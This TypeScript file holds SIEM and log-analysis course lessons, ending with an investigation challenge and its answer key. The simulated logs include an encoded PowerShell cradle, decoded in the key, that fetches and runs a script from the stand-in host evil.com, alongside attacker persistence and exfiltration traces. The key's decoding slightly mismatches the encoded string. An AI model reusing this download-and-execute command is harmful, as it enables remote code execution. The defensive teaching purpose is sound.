import { LessonContent } from "../../lessonContent";

// Module 5: Advanced Log Analysis & SIEM
export const module5: LessonContent[] = [
  {
    id: "5.1",
    courseId: "log-analysis",
    title: "SIEM Architecture & Fundamentals",
    content: `
# SIEM Architecture & Fundamentals

A Security Information and Event Management (SIEM) system is the central nervous system of modern security operations. Understanding how SIEMs work is essential for effective log analysis.

## What is a SIEM?

A **SIEM** is a platform that:
- Collects logs from multiple sources
- Normalizes and correlates events
- Detects threats through rules and analytics
- Provides investigation and response capabilities

### Core SIEM Components

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    SIEM ARCHITECTURE                         │
├─────────────────────────────────────────────────────────────┤
│  Log Sources  │  Collection  │  Processing  │  Analytics   │
│  (Endpoints,  │  (Agents,    │  (Parsing,   │  (Rules,     │
│   Network,   │   Syslog,    │   Normal-    │   ML, UEBA)   │
│   Cloud)     │   API)       │   ization)   │              │
└──────┬───────┴──────┬───────┴──────┬───────┴──────┬───────┘
       │              │              │              │
       └──────────────┼──────────────┼──────────────┘
                      │              │
               ┌──────┴──────┐ ┌─────┴─────┐
               │   Storage   │ │  Search   │
               │ (Hot/Cold)  │ │   Index   │
               └─────────────┘ └───────────┘
\`\`\`

## Log Collection Methods

### 1. Agent-Based
\`\`\`
[Endpoint] → [Agent] → [Collector] → [SIEM]
\`\`\`

**Examples:**
- Splunk Universal Forwarder
- Elastic Agent
- Microsoft MMA/AMA
- Sysmon + WEF

**Pros:**
- Rich data collection
- Real-time streaming
- Local filtering

**Cons:**
- Deployment overhead
- Resource usage
- Maintenance

### 2. Agentless
\`\`\`
[Device] → Syslog/API → [SIEM]
\`\`\`

**Methods:**
- Syslog (UDP/TCP/TLS)
- REST APIs
- File shares
- Database queries

**Pros:**
- No agent deployment
- Simple setup
- Works with legacy devices

**Cons:**
- Limited data
- Reliability issues
- No local processing

## Data Processing Pipeline

### 1. Ingestion
- Receive raw log data
- Validate format
- Handle errors and retries

### 2. Parsing
- Extract structured fields
- Handle multiple formats
- Create common schema

\`\`\`
Raw: "2024-01-15 10:30:00 server sshd[12345]: Failed password for root"
Parsed: {
  timestamp: "2024-01-15T10:30:00Z",
  hostname: "server",
  process: "sshd",
  pid: "12345",
  message: "Failed password for root",
  event_type: "auth_failure",
  user: "root"
}
\`\`\`

### 3. Normalization
- Map vendor fields to common names
- Standardize values
- Enrich with context

\`\`\`
Vendor A: src_ip → Common: source_ip
Vendor B: client_ip → Common: source_ip
Vendor C: remote_addr → Common: source_ip
\`\`\`

### 4. Enrichment
- GeoIP lookup
- Threat intelligence
- Asset information
- User context

## Storage Architecture

### Hot Storage
- Recent data (7-30 days)
- Fast access
- Expensive
- Used for active investigations

### Warm Storage
- Medium age (30-90 days)
- Moderate access speed
- Less expensive
- Used for periodic analysis

### Cold Storage
- Historical data (90+ days)
- Slow access
- Cheapest
- Used for compliance and deep analysis

## Query Languages

### SPL (Splunk)
\`\`\`
index=security sourcetype="linux_secure" 
| stats count by src_ip, user 
| where count > 10
\`\`\`

### KQL (Microsoft Sentinel)
\`\`\`
SecurityEvent
| where EventID == 4625
| summarize count() by IpAddress, TargetUserName
| where count_ > 10
\`\`\`

### Lucene/Elasticsearch
\`\`\`
event_id:"4625" AND source_ip:"192.168.*"
| stats count by source_ip, target_user
| where count > 10
\`\`\`

## SIEM Deployment Models

### 1. On-Premise
- Full control
- High upfront cost
- Maintenance overhead
- Data residency

### 2. Cloud-Native
- No infrastructure
- Pay-as-you-go
- Automatic updates
- Data in cloud

### 3. Hybrid
- Best of both worlds
- Complex management
- Data optimization
- Flexibility

## Popular SIEM Platforms

| Platform | Type | Key Features |
|----------|------|--------------|
| Splunk | Commercial | Powerful search, apps ecosystem |
| Microsoft Sentinel | Cloud | Native Azure integration |
| Elastic SIEM | Open Source | Flexible, cost-effective |
| IBM QRadar | Commercial | Correlation engine |
| LogRhythm | Commercial | UEBA, workflow automation |
| Datadog | Cloud | APM integration |

## SIEM Success Metrics

### Detection Metrics
- Mean Time to Detect (MTTD)
- Alert accuracy
- False positive rate
- Coverage percentage

### Operational Metrics
- Log ingestion rate
- Query performance
- Storage utilization
- System availability

### Business Metrics
- Cost per GB
- Analyst productivity
- Incident reduction
- Compliance posture
    `,
    keyTakeaways: [
      "SIEMs collect, normalize, and correlate logs from multiple sources",
      "Log collection can be agent-based or agentless, each with trade-offs",
      "Data processing includes parsing, normalization, and enrichment",
      "Storage tiers (hot/warm/cold) balance cost and performance",
      "Different SIEMs use different query languages (SPL, KQL, Lucene)"
    ]
  },
  {
    id: "5.2",
    courseId: "log-analysis",
    title: "Detection Rules & Correlation",
    content: `
# Detection Rules & Correlation

Detection rules are the heart of a SIEM's threat detection capability. They transform raw logs into actionable security alerts.

## Detection Rule Types

### 1. Static Rules
Based on known patterns and signatures.

**Example: Brute Force Detection**
\`\`\`
Condition: 5 failed logins from same IP within 5 minutes
Trigger: Alert on potential brute force attack
\`\`\`

### 2. Behavioral Rules
Based on deviations from baseline.

**Example: Unusual Login Time**
\`\`\`
Condition: User logs in at 3 AM (never logged in before)
Trigger: Alert on off-hours activity
\`\`\`

### 3. Correlation Rules
Combine multiple events to detect complex attacks.

**Example: Pass-the-Hash**
\`\`\`
Event 1: Event ID 4624 (Logon) with Logon Type 3
Event 2: Event ID 4624 (Logon) from same account, different host
Within: 5 minutes
Trigger: Alert on potential lateral movement
\`\`\`

### 4. Threshold Rules
Trigger when activity exceeds threshold.

**Example: Mass File Deletion**
\`\`\`
Condition: >100 file deletions by single user in 1 hour
Trigger: Alert on potential ransomware
\`\`\`

### 5. Machine Learning Rules
Use algorithms to detect anomalies.

**Example: UEBA Anomaly**
\`\`\`
Model: User behavior baseline
Trigger: Statistical deviation from normal pattern
Alert: Unusual data access pattern
\`\`\`

## Rule Logic Components

### Conditions
- Field comparisons
- Value ranges
- String matching
- Regex patterns
- List lookups

### Aggregations
- Count
- Sum
- Average
- Min/Max
- Distinct values

### Time Windows
- Fixed windows (last 5 minutes)
- Sliding windows (rolling 1 hour)
- Calendar windows (business hours)

### Grouping
- By user
- By IP
- By host
- By application

## Building Effective Rules

### 1. Start with Hypothesis
\`\`\`
Hypothesis: Attackers will attempt multiple failed logins before success
Evidence: Event ID 4625 followed by 4624
Rule: Detect brute force patterns
\`\`\`

### 2. Define Clear Trigger
\`\`\`
Bad: "Suspicious activity detected"
Good: "SSH brute force attack detected from IP 192.168.1.100"
\`\`\`

### 3. Include Context
\`\`\`
Include in alert:
- Affected assets
- User accounts
- Risk score
- MITRE ATT&CK technique
- Recommended response
\`\`\`

### 4. Test Thoroughly
- Historical data testing
- False positive analysis
- Performance impact
- Alert volume estimation

## Rule Examples

### Windows: Suspicious PowerShell
\`\`\`
// SPL (Splunk)
index=windows sourcetype="powershell" 
EventCode=4104 
ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*"
| stats count by host, user
| where count > 5
\`\`\`

### Linux: SSH Brute Force
\`\`\`
// KQL (Sentinel)
Syslog
| where Facility == "auth" and ProcessName == "sshd"
| where ProcessMessage has "Failed password"
| summarize count() by SourceIP, Account
| where count_ >= 10
\`\`\`

### Network: DGA Detection
\`\`\`
// Lucene (Elastic)
event_type:"dns" AND response_code:"NXDOMAIN"
| stats count by query_name, client_ip
| where count > 50 AND query_name =~ /^[a-z]{10,20}\.com$/
\`\`\`

### Cloud: AWS Root Usage
\`\`\`
// AWS CloudTrail
eventSource = "*" 
AND userIdentity.type = "Root"
AND eventName != "ConsoleLogin"
| stats count by eventName, sourceIPAddress
\`\`\`

## Correlation Examples

### Multi-Stage Attack Detection
\`\`\`
Stage 1: Phishing email delivered
Stage 2: User clicks malicious link
Stage 3: Malware downloads
Stage 4: C2 communication established
Stage 5: Lateral movement begins

Correlation: Link all stages by user and timeline
\`\`\`

### Insider Threat Detection
\`\`\`
Event 1: Data access outside normal hours
Event 2: Large file downloads
Event 3: USB device insertion
Event 4: Email to personal account

Correlation: Pattern of data exfiltration
\`\`\`

## Rule Tuning

### Reducing False Positives
1. **Add exceptions** for known good activities
2. **Adjust thresholds** based on baseline
3. **Narrow scope** to high-risk assets
4. **Add context** from asset inventory

### Increasing Sensitivity
1. **Lower thresholds** for critical assets
2. **Expand time windows** for slow attacks
3. **Add behavioral** components
4. **Include secondary** indicators

## Rule Management

### Documentation
- Purpose and scope
- Logic explanation
- False positive scenarios
- Tuning history
- Owner and review date

### Version Control
- Track rule changes
- Rollback capability
- Change approval process
- Impact assessment

### Performance Optimization
- Efficient field selection
- Proper time windows
- Index optimization
- Query tuning
    `,
    keyTakeaways: [
      "Detection rules transform logs into alerts using various logic types",
      "Effective rules start with a clear hypothesis and include context",
      "Correlation rules combine multiple events to detect complex attacks",
      "Rule tuning is essential to balance detection and false positives",
      "Documentation and version control are critical for rule management"
    ]
  },
  {
    id: "5.3",
    courseId: "log-analysis",
    title: "Threat Hunting with Logs",
    content: `
# Threat Hunting with Logs

Threat hunting is the proactive search for threats that have evaded automated detection. Logs are the primary data source for effective hunting.

## What is Threat Hunting?

**Threat hunting** is the process of proactively searching for attackers in your environment without relying on automated alerts.

### Hunting vs Detection
| Aspect | Automated Detection | Threat Hunting |
|--------|-------------------|----------------|
| Trigger | Rule-based alerts | Hypothesis-driven |
| Scope | Known patterns | Unknown threats |
| Approach | Reactive | Proactive |
| Outcome | Alert/No alert | Finding/No finding |

## The Hunting Process

### 1. Form Hypothesis
Based on:
- Threat intelligence
- Attack trends
- Environment knowledge
- Previous incidents

**Example Hypothesis:**
"Attackers are using compromised service accounts to move laterally during off-hours"

### 2. Build Query
Translate hypothesis into log search:

\`\`\`
// Search for service account usage outside business hours
index=authentication 
account_name="svc_*" 
logon_type=3 
hour_of_day>20 OR hour_of_day<6
| stats count by account_name, source_ip, target_host
\`\`\`

### 3. Analyze Results
Look for:
- Anomalies
- Patterns
- Suspicious activity
- False positives

### 4. Document Findings
- What was found
- Evidence collected
- Risk assessment
- Recommendations

### 5. Create Detections
Turn hunting findings into automated rules.

## Hunting Methodologies

### 1. Hypothesis-Based
Start with specific threat scenario.

**Example:**
- Hypothesis: "Ransomware is encrypting files"
- Search: "Mass file renames with .encrypted extension"
- Evidence: "PowerShell scripts running on file servers"

### 2. IOC-Based
Search for specific indicators.

**Example:**
- IOC: "IP 192.168.1.100 known C2"
- Search: "All connections to this IP"
- Expand: "Find other hosts communicating"

### 3. Pattern-Based
Look for attack patterns.

**Example:**
- Pattern: "MITRE ATT&CK T1059.001 (PowerShell)"
- Search: "Suspicious PowerShell usage"
- Correlate: "With other ATT&CK techniques"

### 4. Entity-Centric
Focus on specific entities.

**Example:**
- Entity: "Domain Admin accounts"
- Search: "All activity by these accounts"
- Analyze: "For unusual patterns"

## Hunting Scenarios

### Scenario 1: Lateral Movement
\`\`\`
// Hypothesis: Attackers moving laterally using stolen credentials

// Step 1: Find unusual logon patterns
index=windows EventCode=4624 LogonType=3
| stats count by TargetUserName, SourceNetworkAddress, WorkstationName
| where count > 10 AND TargetUserName != "ANONYMOUS LOGON"

// Step 2: Check for privileged accounts
| lookup privileged_accounts.csv TargetUserName as user OUTPUT is_admin
| where is_admin = true

// Step 3: Correlate with process execution
| join type=inner TargetUserName 
    [ search index=windows EventCode=4688 
      | where CommandLine matches "*psexec*" OR CommandLine matches "*wmic*" ]
\`\`\`

### Scenario 2: Data Exfiltration
\`\`\`
// Hypothesis: Data being exfiltrated via DNS

// Step 1: Find high DNS query volume
index=dns
| stats count by client_ip, query_name
| where count > 1000

// Step 2: Look for long subdomains (potential data encoding)
| where len(query_name) > 100

// Step 3: Check for base64 patterns
| eval is_base64 = if(match(query_name, "[A-Za-z0-9+/]{20,}"), 1, 0)
| where is_base64 = 1

// Step 4: Decode and analyze
| eval decoded_subdomain = base64decode(substr(query_name, 0, 100))
| table client_ip, query_name, decoded_subdomain
\`\`\`

### Scenario 3: Persistence Mechanisms
\`\`\`
// Hypothesis: Attackers establishing persistence

// Scheduled Tasks
index=windows EventCode=4698 OR EventCode=4702
| stats count by TaskName, Author, Command

// Services
index=windows EventCode=7045
| stats count by ServiceName, ServiceFileName, ImagePath

// Registry Run Keys
index=windows EventCode=4657
| where ObjectName matches "*\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*"
| stats count by ObjectName, ProcessName

// WMI Event Subscription
index=windows EventCode=19
| stats count by Consumer, Filter
\`\`\`

## Hunting Tools and Techniques

### KQL Hunting Queries
\`\`\`
// Find rare processes
SecurityEvent
| where EventID == 4688
| summarize dcount(ProcessName) by ProcessName, Computer
| where dcount_ProcessName == 1
| join kind=inner (SecurityEvent | where EventID == 4688 | summarize count() by ProcessName | where count > 1000) on ProcessName
\`\`\`

### SPL Hunting Queries
\`\`\`
// Find PowerShell without arguments
index=windows sourcetype="powershell" 
EventCode=4104 
| eval arg_count = mvcount(split(ScriptBlockText, " "))
| where arg_count = 1
| stats count by ScriptBlockText, Computer
\`\`\`

### Python for Hunting
\`\`\`python
import pandas as pd
from elasticsearch import Elasticsearch

# Connect to SIEM
es = Elasticsearch(["siem.company.com:9200"])

# Query for suspicious logins
query = {
    "query": {
        "bool": {
            "must": [
                {"term": {"event_id": "4624"}},
                {"range": {"@timestamp": {"gte": "now-7d"}}}
            ]
        }
    }
}

results = es.search(index="security-events", body=query)
df = pd.DataFrame([hit["_source"] for hit in results["hits"]["hits"]])

# Analyze patterns
suspicious = df[
    (df["logon_type"] == 3) & 
    (df["source_ip"].str.startswith("192.168.") == False)
]
print(suspicious[["user", "source_ip", "timestamp"]])
\`\`\`

## Hunting Playbooks

### Initial Access Hunting
1. **External IPs** - Find all external source IPs
2. **Failed Logins** - Look for brute force patterns
3. **New Accounts** - Check for unauthorized accounts
4. **VPN Access** - Review remote access logs

### Privilege Escalation Hunting
1. **Admin Usage** - Track privileged account activity
2. **Group Changes** - Monitor group membership changes
3. **Token Creation** - Look for unusual token usage
4. **Process Elevation** - Find processes with elevated rights

### Lateral Movement Hunting
1. **Network Logons** - Type 3 logons to multiple systems
2. **Remote Tools** - PsExec, WMI, SMB usage
3. **Pass-the-Hash** - Same account, multiple hosts
4. **Resource Access** - Unusual file/share access

### Data Exfiltration Hunting
1. **Large Transfers** - Unusual outbound traffic
2. **USB Activity** - Removable media usage
3. **Email Patterns** - Mass emails, external recipients
4. **Cloud Uploads** - Unusual cloud storage usage

## Hunting Success Metrics

### Process Metrics
- Number of hypotheses tested
- Time per hunt
- Coverage percentage
- Tool effectiveness

### Outcome Metrics
- Threats discovered
- False findings
- Detections created
- Incidents prevented

### Improvement Metrics
- Hunt quality
- Query optimization
- Automation opportunities
- Knowledge sharing
    `,
    keyTakeaways: [
      "Threat hunting is proactive, hypothesis-driven searching for threats",
      "The hunting process: hypothesis → query → analyze → document → automate",
      "Different methodologies: hypothesis-based, IOC-based, pattern-based, entity-centric",
      "Hunting playbooks provide structured approaches for common attack patterns",
      "Success metrics track both process efficiency and hunting outcomes"
    ]
  },
  {
    id: "5.4",
    courseId: "log-analysis",
    title: "Log Retention & Compliance",
    content: `
# Log Retention & Compliance

Proper log retention is critical for security investigations, compliance requirements, and operational needs. Understanding retention policies and legal requirements is essential for any security professional.

## Why Log Retention Matters

### Security Investigations
- Incident reconstruction
- Evidence preservation
- Attack timeline analysis
- Forensic requirements

### Compliance Requirements
- Regulatory mandates
- Audit trails
- Legal discovery
- Industry standards

### Operational Needs
- Troubleshooting
- Performance analysis
- Capacity planning
- Trend analysis

## Common Compliance Requirements

### PCI DSS (Payment Card Industry)
| Requirement | Retention Period | Logs Required |
|-------------|------------------|--------------|
| 10.7 | 1 year (3 months available) | All audit trail history |
| 10.5.3 | 1 year | Security event logs |
| 10.2.7 | 1 year | Log data for all components |

### HIPAA (Healthcare)
| Requirement | Retention Period | Notes |
|-------------|------------------|-------|
| 164.312(b) | 6 years | Audit logs |
| 164.308(a)(1) | 6 years | Access logs |
| 164.310(d)(1) | 6 years | System activity logs |

### SOX (Sarbanes-Oxley)
| Requirement | Retention Period | Focus |
|-------------|------------------|-------|
| 302/404 | 7 years | Financial systems |
| 404 | 7 years | IT controls |
| 302 | 7 years | Access controls |

### GDPR (Europe)
| Requirement | Retention Period | Notes |
|-------------|------------------|-------|
| Article 5 | No longer than necessary | Data minimization |
| Article 25 | Limited | Privacy by design |
| Article 30 | Documentation required | Processing records |

### NERC CIP (Critical Infrastructure)
| Requirement | Retention Period | Systems |
|-------------|------------------|---------|
| CIP-007-6 | 90 days (online) | Cyber security |
| CIP-007-6 | 3 years (offline) | Event logs |
| CIP-008-6 | 3 years | Incident reports |

## Log Classification

### Critical Logs (1-3 years)
- Authentication and authorization
- Security events
- Administrative actions
- Change logs

### Important Logs (180 days - 1 year)
- Application logs
- Database transactions
- Network traffic
- System events

### Informational Logs (30-90 days)
- Debug logs
- Performance metrics
- Operational events
- Health checks

## Retention Strategies

### Hot-Tier Storage (0-30 days)
- Fast access
- Active investigations
- Real-time monitoring
- High cost per GB

### Warm-Tier Storage (30-180 days)
- Moderate access
- Recent incidents
- Compliance needs
- Medium cost per GB

### Cold-Tier Storage (180+ days)
- Slow access
- Historical analysis
- Long-term compliance
- Low cost per GB

### Archive Storage (years)
- Very slow access
- Legal hold
- Regulatory requirements
- Lowest cost per GB

## Storage Solutions

### On-Premise Options
\`\`\`
┌─────────────────────────────────────────────┐
│              ON-PREMISE STORAGE               │
├─────────────┬─────────────┬─────────────────┤
│   SAN/NAS   │   Tape       │   Object Store  │
├─────────────┼─────────────┼─────────────────┤
│ Fast access │ Sequential  │ Scalable       │
│ Expensive   | Very cheap  | Moderate cost   │
│ Limited     | Offline     │ Cloud-like     │
└─────────────┴─────────────┴─────────────────┘
\`\`\`

### Cloud Options
\`\`\`
┌─────────────────────────────────────────────┐
│               CLOUD STORAGE                 │
├─────────────┬─────────────┬─────────────────┤
│    S3       │   Glacier   │   Azure Blob    │
├─────────────┼─────────────┼─────────────────┤
│ Hot/Cool    | Archive     | Hot/Cool/Archive│
│ Pay-per-use | Very cheap  | Pay-per-use    │
│ Global      | Retrieval   | Regional        │
└─────────────┴─────────────┴─────────────────┘
\`\`\`

## Retention Policy Template

### Policy Document Structure
\`\`\`
1. Purpose and Scope
2. Log Classification
3. Retention Periods
4. Storage Requirements
5. Access Controls
6. Deletion Procedures
7. Legal Hold Process
8. Compliance Mapping
9. Review Schedule
10. Exceptions
\`\`\`

### Example Retention Schedule
\`\`\`
| Log Type | Classification | Retention | Storage Tier | Review Date |
|----------|----------------|-----------|--------------|-------------|
| Windows Security | Critical | 2 years | Warm | 2025-01-15 |
| Firewall Logs | Important | 1 year | Cold | 2025-01-15 |
| Debug Logs | Informational | 30 days | Hot | 2025-01-15 |
| IIS Access | Important | 180 days | Warm | 2025-01-15 |
| Database Audit | Critical | 7 years | Cold | 2025-01-15 |
\`\`\`

## Legal Hold Procedures

### Trigger Events
- Litigation notice
- Regulatory investigation
- Internal investigation
- Data breach notification

### Hold Process
1. **Identify** relevant data custodians
2. **Preserve** affected logs
3. **Notify** stakeholders
4. **Document** hold details
5. **Monitor** compliance
6. **Release** when authorized

### Hold Implementation
\`\`\`
// Example: Legal hold on email logs
- Move to immutable storage
- Disable automatic deletion
- Create metadata tag
- Track chain of custody
- Report compliance status
\`\`\`

## Data Privacy Considerations

### PII in Logs
- Usernames
- IP addresses
- Email addresses
- Personal data
- Behavioral data

### Anonymization Techniques
\`\`\`
// Before
user=john.doe email=john@company.com ip=192.168.1.100

// After (pseudonymization)
user=user_1234 email=user_1234@company.com ip=192.168.1.0
\`\`\`

### GDPR Compliance
- Data minimization
- Purpose limitation
- Storage limitation
- Accuracy
- Security
- Accountability

## Implementation Best Practices

### 1. Automate Retention
\`\`\`bash
# Example: Log rotation script
#!/bin/bash
LOG_DIR="/var/log/archive"
RETENTION_DAYS=365

find $LOG_DIR -name "*.log" -mtime +$RETENTION_DAYS -delete
find $LOG_DIR -name "*.log.gz" -mtime +$RETENTION_DAYS -delete
\`\`\`

### 2. Monitor Storage
\`\`\`python
# Storage monitoring script
import shutil
import requests

def check_storage():
    total, used, free = shutil.disk_usage("/var/log")
    percent_used = (used / total) * 100
    
    if percent_used > 85:
        send_alert(f"Log storage at {percent_used}% capacity")
    
    return percent_used
\`\`\`

### 3. Validate Compliance
\`\`\`
# Compliance checklist
□ All critical logs retained for required period
□ Access controls implemented
□ Legal hold process documented
□ Data privacy measures in place
□ Regular reviews scheduled
□ Audit trail maintained
\`\`\`

## Cost Optimization

### Storage Tiers
- Use appropriate tier for each log type
- Implement lifecycle policies
- Compress old logs
- Archive rarely accessed data

### Data Reduction
- Filter noise before storage
- Use efficient formats
- Deduplicate similar logs
- Sample high-volume logs

### Cloud Strategies
- Use infrequent access tiers
- Implement lifecycle policies
- Optimize data transfer
- Monitor usage costs
    `,
    keyTakeaways: [
      "Log retention is driven by security, compliance, and operational needs",
      "Different regulations require different retention periods (PCI: 1 year, HIPAA: 6 years, SOX: 7 years)",
      "Classify logs by importance to determine retention periods",
      "Use storage tiers (hot/warm/cold) to balance cost and access needs",
      "Legal hold procedures must be ready for litigation and investigations"
    ]
  },
  {
    id: "5.5",
    courseId: "log-analysis",
    title: "Hands-On: SIEM Investigation Challenge",
    content: `
# Hands-On: SIEM Investigation Challenge

Put your SIEM skills to the test! Investigate a complex security incident using multiple log sources in a simulated SIEM environment.

## Scenario

Your SIEM generated a high-severity alert: "Potential Advanced Persistent Threat (APT) Activity Detected". Your task is to investigate using the provided log excerpts and determine the full scope of the compromise.

## Alert Details

**Alert Name:** APT-2024-001: Suspicious Cross-Platform Activity
**Severity:** Critical
**First Seen:** 2024-01-15 08:00:00 UTC
**Description:** Multiple suspicious activities detected across Windows, Linux, and cloud environments

## Log Evidence

### 1. Windows Authentication Logs
\`\`\`
Time: 2024-01-15 08:00:00
EventID: 4624
Account Name: admin
Source IP: 203.0.113.50
Logon Type: 10 (RDP)
Computer: DC01

Time: 2024-01-15 08:05:00
EventID: 4688
Process: powershell.exe
CommandLine: powershell -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5wc2EnKSB8IElFWA==
User: admin

Time: 2024-01-15 08:10:00
EventID: 4698
Task Name: \\Microsoft\\Windows\\Update
Command: powershell -ep bypass -f C:\\Windows\\Temp\\update.ps1
\`\`\`

### 2. Linux System Logs
\`\`\`
Time: 2024-01-15 08:15:00
auth.log: Accepted publickey for root from 203.0.113.50 port 54321 ssh2

Time: 2024-01-15 08:20:00
auth.log: useradd[12345]: new user: name=serviceacct, UID=1001, GID=1001

Time: 2024-01-15 08:21:00
auth.log: usermod[12346]: add 'serviceacct' to group 'sudo'

Time: 2024-01-15 08:25:00
syslog: CRON[12347]: (root) CMD (/usr/local/bin/backup.sh)

Time: 2024-01-15 08:30:00
syslog: systemd[1]: Started exfiltrate.service
\`\`\`

### 3. Network Firewall Logs
\`\`\`
Time: 2024-01-15 08:05:15
Action: ALLOW
Source: 10.0.1.100
Destination: 185.234.72.50
Port: 443
Protocol: TCP
Bytes: 2048

Time: 2024-01-15 08:30:15
Action: ALLOW
Source: 10.0.2.50
Destination: 185.234.72.50
Port: 443
Protocol: TCP
Bytes: 50000000

Time: 2024-01-15 08:35:00
Action: DENY
Source: 10.0.1.100
Destination: 192.168.100.50
Port: 445
Protocol: TCP
Bytes: 0
\`\`\`

### 4. AWS CloudTrail Logs
\`\`\`
Time: 2024-01-15 08:40:00
EventName: ConsoleLogin
UserIdentity: admin
SourceIP: 203.0.113.50

Time: 2024-01-15 08:45:00
EventName: CreateAccessKey
UserIdentity: admin
SourceIP: 203.0.113.50

Time: 2024-01-15 08:50:00
EventName: GetObject
BucketName: confidential-data
Key: customer-database.sql
UserIdentity: AKIAIOSFODNN7EXAMPLE
SourceIP: 10.0.1.100
\`\`\`

### 5. DNS Logs
\`\`\`
Time: 2024-01-15 08:05:10
Query: evil.com
Type: A
Response: 185.234.72.50
Client: 10.0.1.100

Time: 2024-01-15 08:30:10
Query: c2.evil.com
Type: A
Response: 185.234.72.50
Client: 10.0.2.50

Time: 2024-01-15 08:35:00
Query: internal.company.local
Type: A
Response: NXDOMAIN
Client: 10.0.1.100
\`\`\`

## Investigation Tasks

### Task 1: Initial Compromise
Identify the initial attack vector and timeline:

1. What was the first suspicious activity?
2. Which system was compromised first?
3. How did the attacker gain access?

### Task 2: Lateral Movement
Map the attacker's movement through the environment:

1. Which systems were accessed?
2. What credentials were used?
3. What techniques were used?

### Task 3: Persistence
Identify persistence mechanisms:

1. What persistence was established on Windows?
2. What persistence was established on Linux?
3. What cloud resources were compromised?

### Task 4: Data Exfiltration
Determine what data was stolen:

1. What data was accessed?
2. How was it exfiltrated?
3. What is the estimated volume?

### Task 5: Command & Control
Identify C2 infrastructure:

1. What domains/IPs were used?
2. What protocols were used?
3. Is the C2 still active?

## Investigation Questions

### Q1: Decoded PowerShell
Decode the base64 PowerShell command. What does it do?

**Decoded Command:** _________________________

**Purpose:** _________________________

### Q2: Timeline
Create a complete timeline of attacker activities:

\`\`\`
08:00:00 ─── _________________________
    │
08:05:00 ─── _________________________
    │
08:10:00 ─── _________________________
    │
08:15:00 ─── _________________________
    │
08:20:00 ─── _________________________
    │
08:25:00 ─── _________________________
    │
08:30:00 ─── _________________________
    │
08:35:00 ─── _________________________
    │
08:40:00 ─── _________________________
    │
08:45:00 ─── _________________________
    │
08:50:00 ─── _________________________
\`\`\`

### Q3: MITRE ATT&CK Mapping
Map techniques to MITRE ATT&CK:

| Technique | ID | Evidence |
|------------|-----|----------|
| Initial Access | | |
| Execution | | |
| Persistence | | |
| Privilege Escalation | | |
| Defense Evasion | | |
| Credential Access | | |
| Discovery | | |
| Lateral Movement | | |
| Collection | | |
| Exfiltration | | |
| Command & Control | | |

### Q4: IOCs
List all indicators of compromise:

**IP Addresses:**
- _________________________
- _________________________

**Domains:**
- _________________________
- _________________________

**Hashes:**
- _________________________

**Accounts:**
- _________________________
- _________________________

**Files:**
- _________________________

### Q5: Impact Assessment
Assess the business impact:

**Affected Systems:**
- _________________________

**Data Compromised:**
- _________________________

**Business Risk:**
- _________________________

## Response Actions

Document immediate containment and eradication steps:

1. _________________________
2. _________________________
3. _________________________
4. _________________________
5. _________________________

## Follow-up Activities

List long-term improvements needed:

1. _________________________
2. _________________________
3. _________________________
4. _________________________
5. _________________________

---

## Answer Key

### Q1: Decoded PowerShell
\`\`\`powershell
iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX
\`\`\`
**Purpose:** Downloads and executes a PowerShell script from evil.com

### Q2: Timeline
\`\`\`
08:00:00 ─── RDP login to DC01 as admin
08:05:00 ─── Downloads and executes malicious PowerShell
08:10:00 ─── Creates persistence via scheduled task
08:15:00 ─── SSH login to Linux as root
08:20:00 ─── Creates serviceacct user
08:21:00 ─── Adds serviceacct to sudo group
08:25:00 ─── Cron job executes backup script
08:30:00 ─── Starts exfiltrate service
08:35:00 ─── Failed attempt to access internal system
08:40:00 ─── AWS console login
08:45:00 ─── Creates AWS access key
08:50:00 ─── Downloads customer database from S3
\`\`\`

### Q3: MITRE ATT&CK Mapping
| Technique | ID | Evidence |
|------------|-----|----------|
| Initial Access | T1078 | Valid accounts (admin, root) |
| Execution | T1059.001 | PowerShell execution |
| Persistence | T1053.005 | Scheduled task |
| Persistence | T1053.003 | Cron job |
| Persistence | T1505.003 | Systemd service |
| Privilege Escalation | T1548.003 | Sudo group addition |
| Credential Access | T1552.001 | AWS access key creation |
| Discovery | T1018 | Remote system discovery |
| Lateral Movement | T1021.002 | SMB/share access |
| Collection | T1213 | Data from information repositories |
| Exfiltration | T1041 | Exfiltration over C2 |
| Command & Control | T1071.001 | Web protocols |

### Q4: IOCs
**IP Addresses:**
- 203.0.113.50 (attacker source)
- 185.234.72.50 (C2 server)
- 10.0.1.100 (compromised Windows)
- 10.0.2.50 (compromised Linux)

**Domains:**
- evil.com
- c2.evil.com

**Accounts:**
- admin (compromised)
- root (compromised)
- serviceacct (created by attacker)

**Files:**
- C:\\Windows\\Temp\\update.ps1
- /usr/local/bin/backup.sh

### Q5: Impact Assessment
**Affected Systems:**
- Domain Controller (DC01)
- Linux server
- AWS account
- Database (customer-database.sql)

**Data Compromised:**
- Customer database
- AWS credentials
- System configurations

**Business Risk:**
- Critical - Customer PII exposed
- Cloud infrastructure compromised
- Domain controller access
    `,
    keyTakeaways: [
      "Cross-platform attacks require correlating logs from multiple systems",
      "Attackers often establish multiple persistence mechanisms",
      "Data exfiltration can occur through various channels (C2, cloud)",
      "MITRE ATT&CK framework helps categorize attacker techniques",
      "Comprehensive investigation requires timeline reconstruction and IOC extraction"
    ],
    practicalExercise: {
      title: "Write Incident Report",
      description: "Create a formal incident report for this APT attack.",
      steps: [
        "Write executive summary",
        "Document complete attack chain",
        "List all compromised assets",
        "Provide containment timeline",
        "Recommend security improvements"
      ]
    }
  },
];
